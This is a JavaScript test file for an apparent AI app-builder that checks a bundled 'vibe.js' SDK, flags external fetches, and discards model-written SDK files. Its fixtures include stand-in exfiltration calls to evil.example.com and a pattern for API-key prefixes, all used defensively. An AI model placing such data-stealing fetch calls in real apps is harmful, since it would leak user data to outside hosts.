import test from 'node:test';
import assert from 'node:assert/strict';
import { checkExternalDeps, readVibeSdk } from '../../validators.js';
import { staticChecks } from '../../lib/checks.js';
import { parseFiles } from '../../lib/files.js';
import { KNOWN_CONNECTORS, usesVibe, vibeProblems, injectSdk, VIBE_RULES, withVibeRules } from '../../lib/vibe.js';

const sdk = readVibeSdk();
const page = (js, head = '<script src="vibe.js"></script>') => `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width">${head}</head><body><!--${'x'.repeat(250)}--><button onclick="go()">Go</button><script>${js}</script></body></html>`;
const crit = (s) => checkExternalDeps(s).filter((i) => i.severity === 'critical');

// ---- the bundled SDK and the validator exemption
test('the bundled vibe.js asset is present and exposes the documented API', () => {
    assert.ok(sdk && sdk.includes('window.vibe') && sdk.includes('vibe.api(connector, path'));
});
test('byte-identical vibe.js is exempt from the external-dependency check', () => {
    assert.equal(crit({ 'index.html': page('vibe.api("nws","/points/1,1")'), 'vibe.js': sdk }).length, 0);
});
test('a vibe.js with extra content is not exempt', () => {
    assert.equal(crit({ 'vibe.js': sdk + '\nfetch("https://evil.example.com/steal");' }).length, 1);
});
test('the proxy host written into any other file is still an external fetch', () => {
    assert.equal(crit({ 'index.html': page('fetch("https://vibe-proxy.vibebuild.cc/x/api")') }).length, 1);
});
test('an app using vibe.js is not given any other exemption', () => {
    assert.equal(crit({ 'index.html': page('fetch("https://evil.example.com/x")'), 'vibe.js': sdk }).length, 1);
});

// ---- detecting use
test('usesVibe detects vibe.api and vibe.ai in html and js but not unrelated text', () => {
    assert.equal(usesVibe({ 'index.html': page('vibe.api("nws","/x")') }), true);
    assert.equal(usesVibe({ 'index.html': page(''), 'js/app.js': 'vibe.ai.ask("hi")' }), true);
    assert.equal(usesVibe({ 'index.html': page('const vibes = 1; // good vibe only; vibration.api') }), false);
    assert.equal(usesVibe({ 'vibe.js': sdk }), false);
});

// ---- problems the fix pass can act on
test('an app that uses vibe with the script tag and a known connector has no problems', () => {
    assert.deepEqual(vibeProblems({ 'index.html': page('vibe.api("nws","/points/1,1"); vibe.ai.ask("hi");') }, { enabled: true }), []);
});
test('using vibe without loading vibe.js is a problem', () => {
    const p = vibeProblems({ 'index.html': page('vibe.ai.ask("hi")', '') }, { enabled: true });
    assert.equal(p.length, 1); assert.match(p[0], /vibe\.js/);
});
test('an unknown connector is a problem that lists the available ones', () => {
    const p = vibeProblems({ 'index.html': page('vibe.api("stocks","/quote")') }, { enabled: true });
    assert.equal(p.length, 1); assert.match(p[0], /stocks/); assert.match(p[0], new RegExp(KNOWN_CONNECTORS[0]));
});
test('a connector name that is not a string literal is a problem', () => {
    const p = vibeProblems({ 'index.html': page('const c = "nws"; vibe.api(c, "/x")') }, { enabled: true });
    assert.equal(p.length, 1); assert.match(p[0], /literal/i);
});
test('when the proxy is not enabled any use of vibe is a problem', () => {
    const p = vibeProblems({ 'index.html': page('vibe.ai.ask("hi")') }, { enabled: false });
    assert.equal(p.length, 1); assert.match(p[0], /not available/i);
});
test('an app that does not use vibe never gets a vibe problem, enabled or not', () => {
    assert.deepEqual(vibeProblems({ 'index.html': page('', '') }, { enabled: true }), []);
    assert.deepEqual(vibeProblems({ 'index.html': page('', '') }, { enabled: false }), []);
});

// ---- the static check pipeline
test('staticChecks reports vibe problems with the existing problem list', () => {
    const r = staticChecks({ 'index.html': page('vibe.api("stocks","/q")') }, { vibe: true });
    assert.equal(r.ok, false); assert.ok(r.problems.some((p) => /stocks/.test(p)));
});
test('staticChecks passes a valid vibe app that ships the SDK file', () => {
    const r = staticChecks({ 'index.html': page('vibe.ai.ask("hi")'), 'vibe.js': sdk }, { vibe: true });
    assert.equal(r.ok, true, JSON.stringify(r.problems));
});
test('staticChecks without the option behaves as before for apps that do not use vibe', () => {
    assert.equal(staticChecks({ 'index.html': page('', '') }).ok, true);
});

// ---- injecting the real SDK
test('injectSdk adds the real vibe.js when the app uses it', () => {
    const out = injectSdk({ 'index.html': page('vibe.ai.ask("hi")') }, { sdk, enabled: true });
    assert.equal(out['vibe.js'], sdk);
});
test('injectSdk replaces a model-written vibe.js and never keeps it', () => {
    const out = injectSdk({ 'index.html': page('vibe.ai.ask("hi")'), 'vibe.js': 'window.vibe = {steal(){}}' }, { sdk, enabled: true });
    assert.equal(out['vibe.js'], sdk);
});
test('injectSdk removes a model-written vibe.js (even in a subfolder) when the app does not use vibe', () => {
    const out = injectSdk({ 'index.html': page('', ''), 'js/vibe.js': 'evil()' }, { sdk, enabled: true });
    assert.equal('vibe.js' in out, false); assert.equal('js/vibe.js' in out, false);
});
test('injectSdk does nothing to an app that does not use vibe and does not mutate its input', () => {
    const input = { 'index.html': page('', '') }; const copy = JSON.stringify(input);
    assert.deepEqual(injectSdk(input, { sdk, enabled: true }), input); assert.equal(JSON.stringify(input), copy);
});
test('injectSdk adds nothing when the proxy is not enabled', () => {
    assert.equal('vibe.js' in injectSdk({ 'index.html': page('vibe.ai.ask("hi")') }, { sdk, enabled: false }), false);
});

// ---- the model must not be able to author the SDK
test('parseFiles ignores a model-written vibe.js block', () => {
    const { files } = parseFiles('<file path="index.html">\nhi\n</file>\n<file path="vibe.js">\nwindow.vibe={}\n</file>\n<file path="js/vibe.js">\nx\n</file>');
    assert.deepEqual(Object.keys(files), ['index.html']);
});

// ---- the prompt rules are gated and carry the contract
test('withVibeRules adds the section only when enabled and never changes the base rules', () => {
    assert.equal(withVibeRules('BASE', false), 'BASE');
    const on = withVibeRules('BASE', true);
    assert.ok(on.startsWith('BASE')); assert.ok(on.includes(VIBE_RULES));
});
test('the rules teach the SDK contract and forbid other network calls and key requests', () => {
    for (const must of ['<script src="vibe.js">', 'vibe.api(', 'vibe.ai.ask(', 'vibe.ai.chat(', 'err.status', 'err.code', 'nws']) assert.ok(VIBE_RULES.includes(must), must);
    assert.match(VIBE_RULES, /never (ask|request).*key/i);
    assert.match(VIBE_RULES, /no other (network|fetch)/i);
});
test('the rules do not contain a secret, a real key shape or the proxy host', () => {
    assert.equal(/sk-|AIza|ghp_|AKIA/.test(VIBE_RULES), false);
    assert.equal(VIBE_RULES.includes('vibebuild.cc'), false);
});
test('the rules list exactly the known connectors', () => {
    for (const c of KNOWN_CONNECTORS) assert.ok(VIBE_RULES.includes(c));
});
